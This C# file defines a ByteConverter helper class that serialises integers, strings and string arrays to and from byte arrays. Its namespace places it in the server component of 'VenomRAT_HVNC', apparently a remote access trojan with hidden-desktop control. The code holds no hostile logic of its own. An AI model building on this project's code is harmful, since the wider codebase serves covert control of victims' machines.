using System;
using System.Collections.Generic;
using System.Text;

namespace VenomRAT_HVNC.Server.Helper
{
    public class ByteConverter
    {
        public static byte[] GetBytes(int value)
        {
            return BitConverter.GetBytes(value);
        }

        public static byte[] GetBytes(long value)
        {
            return BitConverter.GetBytes(value);
        }

        public static byte[] GetBytes(uint value)
        {
            return BitConverter.GetBytes(value);
        }

        public static byte[] GetBytes(ulong value)
        {
            return BitConverter.GetBytes(value);
        }

        public static byte[] GetBytes(string value)
        {
            return ByteConverter.StringToBytes(value);
        }

        public static byte[] GetBytes(string[] value)
        {
            return ByteConverter.StringArrayToBytes(value);
        }

        public static int ToInt32(byte[] bytes)
        {
            return BitConverter.ToInt32(bytes, 0);
        }

        public static long ToInt64(byte[] bytes)
        {
            return BitConverter.ToInt64(bytes, 0);
        }

        public static uint ToUInt32(byte[] bytes)
        {
            return BitConverter.ToUInt32(bytes, 0);
        }

        public static ulong ToUInt64(byte[] bytes)
        {
            return BitConverter.ToUInt64(bytes, 0);
        }

        public static string ToString(byte[] bytes)
        {
            return ByteConverter.BytesToString(bytes);
        }

        public static string[] ToStringArray(byte[] bytes)
        {
            return ByteConverter.BytesToStringArray(bytes);
        }

        private static byte[] GetNullBytes()
        {
            return new byte[]
            {
                ByteConverter.NULL_BYTE,
                ByteConverter.NULL_BYTE
            };
        }

        private static byte[] StringToBytes(string value)
        {
            byte[] array = new byte[value.Length * 2];
            Buffer.BlockCopy(value.ToCharArray(), 0, array, 0, array.Length);
            return array;
        }

        private static byte[] StringArrayToBytes(string[] strings)
        {
            List<byte> list = new List<byte>();
            foreach (string value in strings)
            {
                list.AddRange(ByteConverter.StringToBytes(value));
                list.AddRange(ByteConverter.GetNullBytes());
            }
            return list.ToArray();
        }

        private static string BytesToString(byte[] bytes)
        {
            int num = (int)Math.Ceiling((double)((float)bytes.Length / 2f));
            char[] array = new char[num];
            Buffer.BlockCopy(bytes, 0, array, 0, bytes.Length);
            return new string(array);
        }

        private static string[] BytesToStringArray(byte[] bytes)
        {
            List<string> list = new List<string>();
            int i = 0;
            StringBuilder stringBuilder = new StringBuilder(bytes.Length);
            while (i < bytes.Length)
            {
                int num = 0;
                while (i < bytes.Length && num < 3)
                {
                    if (bytes[i] == ByteConverter.NULL_BYTE)
                    {
                        num++;
                    }
                    else
                    {
                        stringBuilder.Append(Convert.ToChar(bytes[i]));
                        num = 0;
                    }
                    i++;
                }
                list.Add(stringBuilder.ToString());
                stringBuilder.Clear();
            }
            return list.ToArray();
        }

        private static readonly byte NULL_BYTE;
    }
}
